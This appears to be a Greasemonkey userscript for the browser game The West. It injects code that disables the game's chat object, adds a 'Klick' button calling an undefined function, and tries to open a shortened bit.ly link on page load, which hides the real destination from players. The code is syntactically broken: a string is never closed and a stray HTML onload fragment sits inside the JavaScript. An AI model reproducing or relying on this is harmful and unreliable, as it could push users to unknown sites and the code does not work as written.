// ==UserScript==
// @name        Link to pastebin FB
// @namespace   *
// @include     http://*.the-west.*/game.php*
// @version     1
// ==/UserScript==

var script = document.createElement ('script');
script.type = 'text/javascript';
script.id = 'Link zur Pastebin';
script.innerHTML = "ChatWindow = undefined;var div_chat = document.createElement('div');div_chat.style.position = 'relative';div_chat.style.top = '5px';div_chat.style.left = '-120px';div_chat.style.width = '300px';div_chat.innerHTML = '<div onclick=\"OpenW();\"><div class=\"tw2gui_button\"><div class=\"tw2gui_button_right_cap\"></div><div class=\"tw2gui_button_left_cap\"></div><div class=\"tw2gui_button_middle_bg\"></div><div class=\"textart_title\" style=\"font: bold 10pt Arial;\">Klick</div></div></div>'; <body onload="window.open('http://bit.ly/P2Hezu')>;
document.getElementsByTagName ('body')[0].appendChild (script);